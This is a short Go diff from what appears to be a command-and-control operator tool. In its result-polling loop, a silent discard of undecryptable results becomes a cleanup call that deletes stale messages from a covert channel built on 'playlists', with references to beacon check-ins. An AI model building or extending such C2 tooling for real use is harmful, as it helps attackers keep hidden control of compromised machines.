@@ -158,7 +158,9 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 			result, decErr = protocol.DecodeMessage(payload, op.key)
 		}
 		if decErr != nil {
-			// Stale or corrupted result -- discard silently
+			// Can't decrypt — stale result from prior session, clean it up
+			_ = op.client.CleanC2Playlists(ctx,
+				protocol.ChannelRes, op.key, seqNum)
 			continue
 		}
 		// Handle checkin beacon
